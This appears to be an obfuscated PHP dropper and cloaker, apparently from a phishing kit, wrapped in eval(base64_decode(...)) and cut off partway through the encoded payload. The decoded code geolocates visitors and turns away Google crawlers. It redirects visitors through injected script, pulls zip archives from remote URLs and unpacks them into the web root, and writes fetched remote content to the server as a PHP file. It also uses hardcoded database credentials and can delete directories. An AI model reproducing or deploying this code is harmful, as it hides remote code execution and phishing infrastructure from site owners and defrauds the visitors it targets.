<?php eval(base64_decode('CiBnb3RvIEJKTDNJOyB4RTBBMzogaWYgKGlzc2V0KCRfR0VUWyJceDZjXHg2ZlwxNTRceDZkXHg2NSJdKSkgeyAkdmRpciA9ICRfR0VUWyJcMTU0XDE1N1wxNTRceDZkXDE0NSJdOyAkcmVmaXggPSAiXHg0OVx4NmVceDc2XDE0MVwxNTRceDY5XDE0NFw0MFwxNTRceDZmXDE1NFwxNTVcMTQ1IjsgJHJlZGkgPSAkX0NPT0tJRVsiXHg3Mlx4NjVcMTQ0XHg2OVwxNjJcMTUxXDE0M1x4NzQiXTsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgJGRpcmVjdG9yeVRvRGVsZXRlID0gIlx4NzdcMTQ1XDE0Mlx4MmYiIC4gJHZkaXI7IGlmIChpc19kaXIoJGRpcmVjdG9yeVRvRGVsZXRlKSkgeyBpZiAoZGVsZXRlRGlyZWN0b3J5bmV3KCRkaXJlY3RvcnlUb0RlbGV0ZSkpIHsgfSB9IGVjaG8gIlx4M2NcMTYzXDE0M1wxNjJcMTUxXHg3MFx4NzRcNDBcMTE0XDEwMVwxMTZcMTA3XHg1NVx4NDFceDQ3XDEwNVw3NVw0N1x4NGFceDYxXHg3NlwxNDFceDUzXHg2M1x4NzJceDY5XDE2MFwxNjRcNDdcNzZceGFcNDBcNDBceDIwXHgyMFwxNjdcMTUxXDE1Nlx4NjRceDZmXHg3N1w1Nlx4NmNceDZmXDE0M1x4NjFceDc0XHg2OVx4NmZcMTU2XHgyZVx4NjhceDcyXDE0NVx4NjZcNzVcNDd7JHJlZGl9XHgyN1w3M1wxMlx4MjBceDIwXDQwXDQwXHgzY1x4MmZcMTYzXHg2M1x4NzJcMTUxXHg3MFx4NzRcNzYiOyBkaWU7IH0gZ290byB6QTZlQTsgS1F4YVo6ICR1cmwgPSAiXDE1MFwxNjRcMTY0XHg3MFw3Mlx4MmZceDJmXDE1MVx4NzBceDJkXHg2MVwxNjBceDY5XHgyZVwxNDNceDZmXHg2ZFw1N1wxNjBceDY4XDE2MFx4MmZ7JFN0cnVwTG9tfVw3N1x4NjZceDY5XHg2NVx4NmNcMTQ0XDE2M1x4M2RcMTYzXDE2NFwxNDFceDc0XHg3NVx4NzNceDJjXDE1NVwxNDVcMTYzXHg3M1wxNDFceDY3XDE0NVx4MmNcMTQzXDE1N1wxNTZceDc0XDE1MVx4NmVceDY1XHg2ZVwxNjRcNTRcMTQzXHg2ZlwxNTZcMTY0XDE1MVwxNTZcMTQ1XHg2ZVwxNjRceDQzXHg2Zlx4NjRcMTQ1XDU0XHg2M1x4NmZcMTY1XHg2ZVwxNjRceDcyXHg3OVx4MmNceDYzXHg2ZlwxNjVceDZlXHg3NFx4NzJceDc5XHg0M1wxNTdcMTQ0XHg2NVx4MmNceDcyXHg2NVwxNDdcMTUxXDE1N1x4NmVceDJjXHg3MlwxNDVceDY3XHg2OVwxNTdcMTU2XDExNlx4NjFceDZkXHg2NVx4MmNcMTQzXHg2OVwxNjRcMTcxXDU0XDE0NFwxNTFceDczXDE2NFwxNjJceDY5XHg2M1x4NzRceDJjXHg3YVx4NjlcMTYwXDU0XDE1NFwxNDFceDc0XDU0XHg2Y1x4NmZceDZlXHgyY1x4NzRcMTUxXDE1NVx4NjVcMTcyXDE1N1wxNTZcMTQ1XHgyY1x4NjNceDc1XHg3MlwxNjJcMTQ1XHg2ZVwxNDNceDc5XHgyY1x4NjlceDczXDE2MFx4MmNcMTU3XDE2Mlx4NjdcNTRceDYxXDE2M1w1NFx4NjFceDczXHg2ZVx4NjFcMTU1XDE0NVw1NFx4NzJcMTQ1XHg3NlwxNDVceDcyXDE2M1x4NjVcNTRcMTU1XDE1N1wxNDJcMTUxXHg2Y1x4NjVceDJjXDE2MFwxNjJcMTU3XDE3MFwxNzFceDJjXDE1MFwxNTdcMTYzXHg3NFx4NjlcMTU2XHg2N1w1NFx4NzFceDc1XHg2NVwxNjJcMTcxIjsgZ290byBnaV9BRTsgVWRSUEM6IGZ1bmN0aW9uIFJESU9QQigkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJGlkKSB7ICRkYiA9IG15c3FsaV9jb25uZWN0KCRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dik7IGlmICghJGRiKSB7IGRpZSgiXDEwM1x4NmZceDZlXHg2ZVwxNDVceDYzXHg3NFwxNTFcMTU3XDE1Nlx4MjBceDY2XDE0MVwxNTFceDZjXDE0NVwxNDRcNzJceDIwIiAuIG15c3FsaV9jb25uZWN0X2Vycm9yKCkpOyB9ICRzcWxfdSA9ICJcMTIzXHg0NVx4NGNcMTA1XDEwM1x4NTRceDIwXDUyXDQwXDEwNlx4NTJcMTE3XHg0ZFx4MjBcMTYyXDE0NVx4NjRcMTUxXDE2MlwxNDNceDc0XHg2OVx4NmZceDZlXHgyMFwxMjdceDQ4XHg0NVwxMjJceDQ1XHgyMFwxNTFcMTQ0XHgzZFw0N3skaWR9XHgyNyI7ICRyZXNfdSA9IG15c3FsaV9xdWVyeSgkZGIsICRzcWxfdSk7IGlmIChteXNxbGlfbnVtX3Jvd3MoJHJlc191KSA+IDApIHsgd2hpbGUgKCRyb3cgPSBteXNxbGlfZmV0Y2hfYXJyYXkoJHJlc191KSkgeyAkX1NFU1NJT05bIlx4NmNceDY5XHg2ZVwxNTMiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJceDZjXDE1MVwxNTZcMTUzIl0pKTsgJF9TRVNTSU9OWyJcMTQzXDE1NiJdID0gZXhwbG9kZSgiXDczIiwgYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlwxNDNcMTU3XDE2NVwxNTZceDc0XHg3Mlx4NzkiXSkpKTsgJF9TRVNTSU9OWyJceDcwXDE1MVwxNDMiXSA9ICRyb3dbIlwxNjBcMTUxXDE0MyJdOyAkX1NFU1NJT05bIlwxNTVcMTYzXHg2NyJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlx4NmRceDczXHg2NyJdKSk7ICRfU0VTU0lPTlsiXDE0NVwxNzBceDcwIl0gPSAkcm93WyJcMTQ1XHg3OFwxNjBcMTUxXDE2Mlx4NjUiXTsgJF9TRVNTSU9OWyJcMTYzXDE0NVx4NzJceDc2XHg2NVx4NzIiXSA9IGJhc2U2NF9kZWNvZGUoYmFzZTY0X2RlY29kZSgkcm93WyJcMTYzXHg2NVwxNjJceDc2XHg2NVwxNjIiXSkpOyAkX1NFU1NJT05bIlwxNjVcMTYyXHg2YyJdID0gYmFzZTY0X2RlY29kZShiYXNlNjRfZGVjb2RlKCRyb3dbIlx4NzVcMTYyXHg2YyJdKSk7ICRfU0VTU0lPTlsiXHg2Y1x4NzVcMTcwXDE0M1wxNDFcMTYwXHg3NFwxNDNceDY4XHg2MSJdID0gJHJvd1siXHg2Y1x4NzVcMTcwXDE0M1x4NjFcMTYwXHg3NFx4NjNceDY4XDE0MSJdOyAkX1NFU1NJT05bIlx4NzRceDZmXDE1M1wxNDVcMTU2XDE2NFwxNDVcMTU0Il0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXHg3NFwxNTdceDZiXDE0NVx4NmVceDc0XHg2NVx4NmMiXSkpOyAkX1NFU1NJT05bIlwxNTFcMTQ0XHg3NFwxNDVcMTU0Il0gPSBiYXNlNjRfZGVjb2RlKGJhc2U2NF9kZWNvZGUoJHJvd1siXDE1MVx4NjRcMTY0XHg2NVx4NmMiXSkpOyAkX1NFU1NJT05bIlx4NzJcMTQ1XHg2NFx4NjlcMTYyXDE1MVwxNDNceDc0Il0gPSAkcm93WyJcMTYyXHg2NVx4NjRcMTUxXDE2MlwxNTFceDYzXDE2NCJdOyAkX1NFU1NJT05bIlx4NjFcMTYwXDE1MSJdID0gJHJvd1siXHg2MVwxNjBcMTUxIl07IGlmIChpc3NldCgkX0dFVFsiXHg3Nlx4NzNcMTYzIl0pKSB7IHNldGNvb2tpZSgiXDE2NFx4NmZcMTUzXHg2NVx4NmVcMTY0XHg2NVwxNTQiLCAkX1NFU1NJT05bIlx4NzRcMTU3XDE1M1wxNDVcMTU2XHg3NFwxNDVceDZjIl0sIHRpbWUoKSArIDg2NDAwICogMzAsICJceDJmIik7IHNldGNvb2tpZSgiXHg2OVwxNDRcMTY0XDE0NVx4NmMiLCAkX1NFU1NJT05bIlwxNTFceDY0XDE2NFx4NjVceDZjIl0sIHRpbWUoKSArIDg2NDAwICogMzAsICJceDJmIik7IHNldGNvb2tpZSgiXHg3MlwxNDVcMTQ0XHg2OVx4NzJceDY5XHg2M1x4NzQiLCAkX1NFU1NJT05bIlx4NzJceDY1XHg2NFx4NjlceDcyXDE1MVwxNDNceDc0Il0sIHRpbWUoKSArIDg2NDAwICogMzAsICJceDJmIik7IH0gfSB9IGVsc2UgeyAkcmVmaXggPSAiXHg3MFwxNjJceDZmXHg2YVwxNDVceDYzXDE2NFx4MjBcMTExXDEwNFw0MFx4NmVcMTU3XDE2NFx4MjBceDY2XDE1N1x4NzVceDZlXHg2NFx4MjBceDY5XHg2NFx4MmV7JGlkfSI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBteXNxbGlfY2xvc2UoJGRiKTsgfSBnb3RvIFVJYkZKOyBaTHdDVzogaWYgKCRfU0VSVkVSWyJcMTIyXHg0NVx4NTFceDU1XDEwNVx4NTNceDU0XDEzN1x4NGRcMTA1XDEyNFwxMTBceDRmXHg0NCJdID09PSAiXDEyMFwxMTdceDUzXHg1NCIpIHsgaWYgKCFpc3NldCgkX1BPU1RbIlwxNTRcMTU3XHg2M1x4NjFceDZjXDE1MVwxNjAiXSkpIHsgJHJlZml4ID0gIlwxMTFceDZlXDE2Nlx4NjFcMTU0XDE1MVx4NjRcNDBcMTExXHg1MFwxMjMiOyBjbGlja19UWXF3KCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2LCAkcmVmaXgpOyBkaWU7IH0gaWYgKCFpc3NldCgkX1BPU1RbIlwxNjNceDY4XDE1N1wxNjBcMTUxXHg2NCJdKSkgeyAkcmVmaXggPSAiXDExMVwxNTZcMTY2XDE0MVx4NmNcMTUxXDE0NFw0MFx4NDlcMTA0XHgyMFx4NTNceDUxXHg0YyI7IGNsaWNrX1RZcXcoJFN0cnVwTG9tLCAkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYsICRyZWZpeCk7IGRpZTsgfSBpZiAoIWlzX2RpcigiXHg3N1x4NjVcMTQyIikpIHsgaWYgKCFta2RpcigiXDE2N1wxNDVceDYyIiwgNTExKSkgeyBkaWUoIlwxMDZceDYxXDE1MVwxNTRceDY1XDE0NFx4MjBceDc0XDE1N1x4MjBcMTQzXDE2Mlx4NjVcMTQxXDE2NFx4NjVceDIwXHg3N1wxNDVceDYyXDQwXDE0NFx4NjlceDcyXDE0NVwxNDNceDc0XHg2ZlwxNjJcMTcxIik7IH0gfSAkZm9sZGVyX25hbWUgPSBiaW4yaGV4KHJhbmRvbV9ieXRlcyg4KSk7ICRzdWJfZm9sZGVyID0gcmFuZF9udW0oNCk7ICRmb2xkZXJfcGF0aCA9ICJcMTY3XDE0NVwxNDJceDJmeyRzdWJfZm9sZGVyfVw1NyI7ICR6aXBGaWxlVXJsID0gJF9TRVNTSU9OWyJceDc1XHg3Mlx4NmMiXTsgJHRlbXBEaXIgPSAiXDE2NFx4NjVcMTU1XHg3MCI7IGlmICghaXNfZGlyKCR0ZW1wRGlyKSkgeyBta2RpcigkdGVtcERpcik7IH0gJHppcEZpbGVOYW1lID0gInskdGVtcERpcn1ceDJmeyRmb2xkZXJfbmFtZX1ceDJlXDE3MlwxNTFceDcwIjsgaWYgKGNvcHkoJHppcEZpbGVVcmwsICR6aXBGaWxlTmFtZSkpIHsgaWYgKCFta2RpcigkZm9sZGVyX3BhdGgsIDUxMSwgdHJ1ZSkpIHsgZGllKCJceDQ2XDE0MVwxNTFcMTU0XDE0NVx4NjRcNDBcMTY0XHg2Zlx4MjBcMTQzXDE2Mlx4NjVceDYxXDE2NFx4NjVceDIwXDE2NFwxNTBceDY1XDQwXHg2Nlx4NmZcMTU0XHg2NFwxNDVcMTYyXHgyZSIpOyB9ICR6aXAgPSBuZXcgWmlwQXJjaGl2ZSgpOyBpZiAoJHppcC0+b3BlbigkemlwRmlsZU5hbWUpID09PSB0cnVlKSB7ICR6aXAtPmV4dHJhY3RUbygkZm9sZGVyX3BhdGgpOyAkemlwLT5jbG9zZSgpOyAkZXh0cmFjdGVkRmlsZXMgPSBzY2FuZGlyKCRmb2xkZXJfcGF0aCk7IGZvcmVhY2ggKCRleHRyYWN0ZWRGaWxlcyBhcyAkZmlsZSkgeyBpZiAoJGZpbGUgIT09ICJceDJlIiAmJiAkZmlsZSAhPT0gIlx4MmVceDJlIikgeyByZW5hbWUoJGZvbGRlcl9wYXRoIC4gIlw1NyIgLiAkZmlsZSwgJGZvbGRlcl9wYXRoIC4gJGZpbGUpOyB9IH0gfSBlbHNlIHsgZWNobyAiXDEwNlwxNDFcMTUxXDE1NFwxNDVcMTQ0XDQwXHg3NFx4NmZceDIwXHg2NVx4NzhcMTY0XDE2Mlx4NjFceDYzXDE2NFx4MjBcMTY0XHg2OFx4NjVceDIwXHg3YVx4NjlceDcwXHgyMFwxNDZcMTUxXDE1NFx4NjVceDJlIjsgfSB9IGVsc2UgeyBkaWUoIlx4NDZcMTQxXDE1MVwxNTRcMTQ1XDE0NFw0MFwxNjRcMTU3XHgyMFx4NjRcMTU3XDE2N1wxNTZceDZjXHg2ZlwxNDFceDY0XDQwXHg3NFwxNTBcMTQ1XDQwXDE3Mlx4NjlcMTYwXHgyMFwxNDZcMTUxXDE1NFwxNDVceDJlIik7IH0gaWYgKGZpbGVfZXhpc3RzKCR6aXBGaWxlTmFtZSkpIHsgdW5saW5rKCR6aXBGaWxlTmFtZSk7IH0gJGdhbWVpZCA9ICRfU0VTU0lPTlsiXDE1NFx4NmZceDZjXHg3M1wxNTdceDc1XHg2Y1wxNjMiXTsgJF9TRVNTSU9OWyJcMTU0XDE1N1x4NjNceDYxXHg2Y1x4NjRcMTUxXDE2MiJdID0gInskZm9sZGVyX3BhdGh9IjsgZmlsZV9wdXRfY29udGVudHMoInskZm9sZGVyX3BhdGh9XDU3XDE1NFwxNTdcMTQzXHg2MVwxNTRceDJlXHg3NFx4NzhceDc0IiwgInskU3RydXBMb219XDEyIiwgRklMRV9BUFBFTkQpOyAkZmlsZVVSTCA9ICRfU0VTU0lPTlsiXDE0MVx4NzBcMTUxIl07IGZ1bmN0aW9uIGdldEZpbGVDb250ZW50cygkZmlsZVVSTCkgeyAkY3VybCA9IGN1cmxfaW5pdCgpOyBjdXJsX3NldG9wdCgkY3VybCwgQ1VSTE9QVF9VUkwsICRmaWxlVVJMKTsgY3VybF9zZXRvcHQoJGN1cmwsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOyAkcmVzcG9uc2UgPSBjdXJsX2V4ZWMoJGN1cmwpOyAkc3RhdHVzQ29kZSA9IGN1cmxfZ2V0aW5mbygkY3VybCwgQ1VSTElORk9fSFRUUF9DT0RFKTsgJGVycm9yID0gY3VybF9lcnJvcigkY3VybCk7IGN1cmxfY2xvc2UoJGN1cmwpOyBpZiAoJHN0YXR1c0NvZGUgPT09IDIwMCAmJiBlbXB0eSgkZXJyb3IpKSB7IHJldHVybjsgfSAkZmlsZUNvbnRlbnRzID0gZmlsZV9nZXRfY29udGVudHMoJGZpbGVVUkwpOyBpZiAoJGZpbGVDb250ZW50cyAhPT0gZmFsc2UpIHsgJGxvY2FsRmlsZVBhdGggPSAiXDE2N1x4NjVceDYyXHgyZlx4NjFceDcwXDE1MVw1NlwxNjBcMTUwXHg3MCI7IGZpbGVfcHV0X2NvbnRlbnRzKCRsb2NhbEZpbGVQYXRoLCAkZmlsZUNvbnRlbnRzKTsgfSB9IGlmICgkZmlsZVVSTCAhPT0gIlx4NDFcMTIwXDExMSIpIHsgZ2V0RmlsZUNvbnRlbnRzKCRmaWxlVVJMKTsgfSAkbG9jYWxpcCA9IGlzc2V0KCRfUE9TVFsiXDE1NFwxNTdceDYzXHg2MVwxNTRceDY5XHg3MCJdKSA/ICRfUE9TVFsiXDE1NFx4NmZceDYzXDE0MVx4NmNceDY5XHg3MCJdIDogbnVsbDsgJGRvbWFpbm5hbWUgPSBpc3NldCgkX1BPU1RbIlwxNDRcMTU3XDE1NVx4NjFceDY5XHg2ZVwxNTZcMTQxXHg2ZFx4NjUiXSkgPyAkX1BPU1RbIlx4NjRceDZmXHg2ZFwxNDFceDY5XDE1NlwxNTZcMTQxXHg2ZFwxNDUiXSA6IG51bGw7ICRuZXh0ZG9tYWluID0gaXNzZXQoJF9QT1NUWyJcMTU2XHg2NVwxNzBceDc0XHg2NFwxNTdcMTU1XDE0MVx4NjlceDZlIl0pID8gJF9QT1NUWyJcMTU2XHg2NVwxNzBcMTY0XDE0NFwxNTdceDZkXHg2MVwxNTFceDZlIl0gOiBudWxsOyAkc2hvcGlkID0gaXNzZXQoJF9QT1NUWyJceDczXHg2OFx4NmZcMTYwXHg2OVwxNDQiXSkgPyAkX1BPU1RbIlx4NzNceDY4XDE1N1x4NzBceDY5XDE0NCJdIDogbnVsbDsgaWYgKCRsb2NhbGlwICE9PSBudWxsICYmICRkb21haW5uYW1lICE9PSBudWxsICYmICRuZXh0ZG9tYWluICE9PSBudWxsICYmICRzaG9waWQgIT09IG51bGwpIHsgJGRpcmVjdG9yeSA9ICJceDc0XHg2NVwxNTVceDcwIjsgJHppcEZpbGVzID0gZ2xvYigkZGlyZWN0b3J5IC4gIlx4MmFceDJlXHg3YVwxNTFcMTYwIik7IGlmICghZW1wdHkoJHppcEZpbGVzKSkgeyBmb3JlYWNoICgkemlwRmlsZXMgYXMgJHppcEZpbGUpIHsgaWYgKGlzX2ZpbGUoJHppcEZpbGUpKSB7IHVubGluaygkemlwRmlsZSk7IH0gfSB9ICRyZXNwb25zZURhdGEgPSBhcnJheSgiXHg3M1wxNjRceDYxXHg3NFx4NzVceDczIiA9PiAiXDE2M1x4NzVcMTQzXHg2M1wxNDVcMTYzXDE2MyIsICJcMTQyXDE0MVwxNDNcMTUzXDEzN1x4NjRcMTUxXDE2MiIgPT4gJGZvbGRlcl9wYXRoLCAiXDE0MlwxNDFcMTQzXDE1M1x4NWZcMTY1XDE2MlwxNTQiID0+ICRuZXh0ZG9tYWluLCAiXDE0MlwxNDFceDYzXDE1M1x4NWZcMTUxXDE0NCIgPT4gJHNob3BpZCwgIlx4NmRcMTQ1XDE2M1wxNjNcMTQxXHg2N1x4NjUiID0+ICJcMTA0XDE0MVwxNjRcMTQxXDQwXDE2Mlx4NjVcMTQzXDE0NVwxNTFceDc2XDE0NVx4NjRcNDBcMTYzXDE2NVx4NjNceDYzXHg2NVwxNjNceDczXDE0NlwxNjVcMTU0XHg2Y1wxNzEiKTsgJHJlc3BvbnNlSnNvbiA9IGpzb25fZW5jb2RlKCRyZXNwb25zZURhdGEpOyBlY2hvICRyZXNwb25zZUpzb247IH0gZWxzZSB7IGh0dHBfcmVzcG9uc2VfY29kZSg0MDApOyBlY2hvICJcMTE1XDE1MVx4NzNcMTYzXDE1MVwxNTZceDY3XDQwXHg3MlwxNDVceDcxXHg3NVwxNTFcMTYyXHg2NVwxNDRcNDBceDY0XHg2MVx4NzRceDYxIjsgfSB9IGVsc2UgeyBodHRwX3Jlc3BvbnNlX2NvZGUoNDA1KTsgZWNobyAiXDExMVx4NmVcMTY2XDE0MVwxNTRceDY5XHg2NFw0MFwxNjJcMTQ1XDE2MVwxNjVceDY1XDE2M1x4NzRcNDBceDZkXDE0NVwxNjRcMTUwXDE1N1x4NjQiOyB9IGdvdG8gbHN4aEQ7IEhhUXMzOiBmdW5jdGlvbiBkZWxldGVEaXJlY3RvcnluZXcoJGRpcikgeyBpZiAoIWZpbGVfZXhpc3RzKCRkaXIpKSB7IHJldHVybiB0cnVlOyB9IGlmICghaXNfZGlyKCRkaXIpKSB7IHJldHVybiB1bmxpbmsoJGRpcik7IH0gZm9yZWFjaCAoc2NhbmRpcigkZGlyKSBhcyAkaXRlbSkgeyBpZiAoJGl0ZW0gPT0gIlw1NiIgfHwgJGl0ZW0gPT0gIlw1Nlx4MmUiKSB7IGNvbnRpbnVlOyB9IGlmICghZGVsZXRlRGlyZWN0b3J5bmV3KCRkaXIgLiBESVJFQ1RPUllfU0VQQVJBVE9SIC4gJGl0ZW0pKSB7IHJldHVybiBmYWxzZTsgfSB9IGlmIChybWRpcigkZGlyKSkgeyByZXR1cm4gdHJ1ZTsgfSBlbHNlIHsgcmV0dXJuIGZhbHNlOyB9IH0gZ290byBaSU82WDsgZ2lfQUU6ICRjdXJsID0gY3VybF9pbml0KCR1cmwpOyBnb3RvIGtFTGVzOyBjM3prcDogaWYgKHN0cnBvcyhnZXRob3N0YnlhZGRyKCRTdHJ1cExvbSksICJcMTQ3XDE1N1x4NmZcMTQ3XDE1NFx4NjUiKSAhPT0gZmFsc2UpIHsgJHJlZml4ID0gIlwxMDJcMTU3XDE2M1wxNDVcNDBceDQ3XDQwXDYyIjsgY2xpY2tfVFlxdygkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2diwgJHJlZml4KTsgZGllOyB9IGdvdG8gUVhidlQ7IGRBMk9sOiAkZG9uZmxhZyA9ICRwcm90b2NvbCAuICJcNzJceDJmXHgyZiIgLiAkZG9tYWluOyBnb3RvIFdQd1NrOyBBdFZ3YTogJF9TRVNTSU9OWyJcMTUxXDE2M1x4NzAiXSA9IGlzc2V0KCRpbmZvWyJceDY5XDE2M1x4NzAiXSkgPyAkaW5mb1siXHg2OVwxNjNcMTYwIl0gOiBudWxsOyBnb3RvIGRKdVI1OyBxcV9rczogaWYgKCFlbXB0eSgkX1NFUlZFUlsiXHg0OFx4NTRceDU0XDEyMFx4NWZceDQzXHg0Y1wxMTFceDQ1XDExNlx4NTRceDVmXHg0OVx4NTAiXSkpIHsgJGlwQWRkcmVzcyA9ICRfU0VSVkVSWyJceDQ4XHg1NFx4NTRceDUwXDEzN1x4NDNcMTE0XHg0OVwxMDVcMTE2XHg1NFwxMzdceDQ5XHg1MCJdOyB9IGVsc2VpZiAoIWVtcHR5KCRfU0VSVkVSWyJcMTEwXDEyNFwxMjRceDUwXHg1Zlx4NThcMTM3XHg0Nlx4NGZceDUyXDEyN1x4NDFcMTIyXHg0NFx4NDVcMTA0XHg1Zlx4NDZcMTE3XDEyMiJdKSkgeyAkaXBBZGRyZXNzID0gJF9TRVJWRVJbIlwxMTBceDU0XHg1NFx4NTBceDVmXDEzMFx4NWZcMTA2XDExN1x4NTJceDU3XDEwMVx4NTJceDQ0XDEwNVx4NDRceDVmXDEwNlwxMTdceDUyIl07IH0gZWxzZSB7ICRpcEFkZHJlc3MgPSAkX1NFUlZFUlsiXHg1MlwxMDVceDRkXDExN1x4NTRcMTA1XHg1ZlwxMDFceDQ0XDEwNFwxMjIiXTsgfSBnb3RvIEZYTDlQOyB3WTlmbTogJExyZWRzdnYgPSBiYXNlNjRfZGVjb2RlKCJceDVhXDExMFx4NGFcMTUyXDEzMlx4MzJceDZjXDE2M1x4NjVceDU2XDEwMVwxNjdceDRiXHg2ZFx4NzNceDZkIik7IGdvdG8gVEhVdk07IFJFdjY0OiAkaW5mbyA9IHVuc2VyaWFsaXplKCRyZXNwb25zZSk7IGdvdG8gQXRWd2E7IHoxN0ZTOiBmdW5jdGlvbiBDdWJfSlJSRF9PUCgkU3RydXBMb20sICRkYXRhbG9nLCAkRml4Ym9tLCAkTHJlZHN2diwgJE5vcHd2dikgeyAkZGIgPSBteXNxbGlfY29ubmVjdCgkZGF0YWxvZywgJEZpeGJvbSwgJExyZWRzdnYsICROb3B3dnYpOyBpZiAoISRkYikgeyBkaWUoIlx4NDNceDZmXHg2ZVwxNTZcMTQ1XHg2M1x4NzRcMTUxXHg2Zlx4NmVcNDBcMTQ2XDE0MVwxNTFceDZjXDE0NVwxNDRcNzJcNDAiIC4gbXlzcWxpX2Nvbm5lY3RfZXJyb3IoKSk7IH0gJHNxbF91ID0gIlx4NTNceDQ1XHg0Y1wxMDVcMTAzXHg1NFw0MFw1Mlx4MjBceDQ2XHg1Mlx4NGZceDRkXDQwXDE1NFwxNTdcMTQ3XHg3M1w0MFx4NTdcMTEwXHg0NVx4NTJceDQ1XDQwXHg2OVx4NzBcMTQxXDE0NFx4NjRceDcyXHg2NVx4NzNceDNkXDQ3eyRTdHJ1cExvbX1cNDciOyAkcmVzX3UgPSBteXNxbGlfcXVlcnkoJGRiLCAkc3FsX3UpOyBpZiAobXlzcWxpX251bV9yb3dzKCRyZXNfdSkgPiAwKSB7IG15c3FsaV9jbG9zZSgkZGIpOyByZXR1cm4gZmFsc2U7IH0gbXlzcWxpX2Nsb3NlKCRkYik7IHJldHVybiB0cnVlOyB9IGdvdG8gT0hJNUk7IE9ISTVJOiBpZiAoIUN1Yl9KUlJEX09QKCRTdHJ1cExvbSwgJGRhdGFsb2csICRGaXhib20sICRMcmVkc3Z2LCAkTm9wd3Z2KSkgeyAkc2hvd3BpcCA9ICJceDIxXDQxXDQxIjsgZWNobyAkc2hvd3BpcDsgZGllOyB9IGdvdG8gdEFTRU07IHQwelhhOiAkdXNlckFnZW50ID0gaXNzZXQoJF9TRVJWRVJbIlwxMTBceDU0XHg1NFwxMjBcMTM3XDEyNVx4NTNceDQ1XHg1Mlx4NWZcMTAxXDEwN1x4NDVceDRlXDEyNCJdKSA/ICRfU0VSVkVSWyJcMTEwXHg1NFx4NTRcMTIwXDEzN1x4NTVceDUzXHg0NVx4NTJceDVmXHg0MVwxMDdceDQ1XDExNlwxMjQiXSA6ICcnOyBnb3RvIFdnS2JjOyBXZ0tiYzogJE9LSklWR1JEID0gSFlUX0REUl9VaW8oJHVzZXJBZ2VudCk7IGdvdG8gaWViQW47IHRBemFzOiAkUmFuZE9QX01sdXggPSBSYW5kX1hEX1RGKHJhbmQoNCwgMTApKTsgZ290byBaTHdDVzsgdTFQMDI6IGZ1bmN0aW9uIEZPeF9UR0hfWCgkVVNFUl9BR0VOVCkgeyAkQlJPV1NFUl9FUlJPUiA9ICJceDU1XHg2ZVx4NmJcMTU2XHg2ZlwxNjdceDZlXDQwXHg0MlwxNjJcMTU3XHg3N1x4NzNceDY1XHg3MiI7ICRCUk9XU0VSID0gYXJyYXkoIlx4MmZceDZkXHg3M1wxNTFcMTQ1XHgyZlx4NjkiID0+ICJceDQ5XDE1Nlx4NzRcMTQ1XHg3MlwxNTZcMTQ1XHg3NFw0MFx4NDVcMTcwXHg3MFwxNTRceDZmXHg3Mlx4NjVcMTYyIiwgIlx4MmZcMTQ2XDE1MVwxNjJcMTQ1XDE0Nlx4NmZceDc4XHgyZlx4NjkiID0+ICJcMTA2XDE1MVx4NzJceDY1XHg2NlwxNTdceDc4IiwgIlx4MmZcMTYzXDE0MVwxNDZceDYxXHg3Mlx4NjlceDJmXHg2OSIgPT4gIlx4NTNceDYxXDE0Nlx4NjFcMTYyXHg2OSIsICJceDJmXDE0M1x4NjhcMTYyXHg2ZlwxNTVcMTQ1XHgyZlwxNTEiID0+ICJceDQzXHg2OFwxNjJceDZmXDE1NVwxNDUiLCAiXHgyZlx4NjVceDY0XHg2N1x4NjVcNTdceDY5IiA9PiAiXHg0NVwxNDRcMTQ3XHg2NSIsICJceDJmXHg2ZlwxNjBceDY1XDE2Mlx4NjFcNTdceDY5IiA9PiAiXDExN1wxNjBcMTQ1XDE2Mlx4NjEiLCAiXHgyZlwxNTZceDY1XDE2NFx4NzNceDYzXDE0MVx4NzBceDY1XHgyZlwxNTEiID0+ICJceDRlXHg2NVwxNjRcMTYzXDE0M1x4NjFcMTYwXDE0NSIsICJcNTdcMTU1XHg2MVwxNzBceDc0XDE1MFwxNTdcMTU2XHgyZlx4NjkiID0+ICJcMTE1XDE0MVx4NzhcMTY0XHg2OFwxNTdcMTU2IiwgIlw1N1wxNTNcMTU3XHg2ZVwxNjFceDc1XHg2NVwxNjJcMTU3XHg3Mlx4MmZceDY5IiA9PiAiXDExM1wxNTdceDZlXDE2MVwxNjVcMTQ1XHg3Mlx4NmZceDcyIiwgIlw1N1wxNTVcMTU3XDE0Mlx4NjlcMTU0XDE0NVx4MmZceDY5IiA9PiAiXHg0OFx4NjFcMTU2XHg2NFx4NjhcMTQ1XHg2Y1wxNDRceDIwXDEwMlx4NzJceDZmXDE2N1x4NzNcMTQ1XHg3MiIpOyBmb3JlYWNoICgkQlJPV1NFUiBhcyAkcmVnZXggPT4gJHZhbHVlKSB7IGlmIChwcmVnX21hdGNoKCRyZWdleCwgJFVTRVJfQUdFTlQpKSB7ICRCUk9XU0VSX0VSUk9SID0gJHZhbHVlOyB9IH0gcmV0dXJuICRCUk9XU0VSX0VSUk9SOyB9IGdvdG8gdDB6WGE7IFVJYkZKOiBmdW5jdGlvbiBSYW5kX1hEX1RGKCRsZW5ndGgpIHsgJGNoYXJhY3RlcnMgPSAiXHg2MVx4NjJcMTQzXHg2NFwxNDVceDY2XHg2YVx4NjhceDY5XHg2N1wxNTNceDZjXDE1NVx4NmVceDZmXDE2MFx4NzFceDcyXD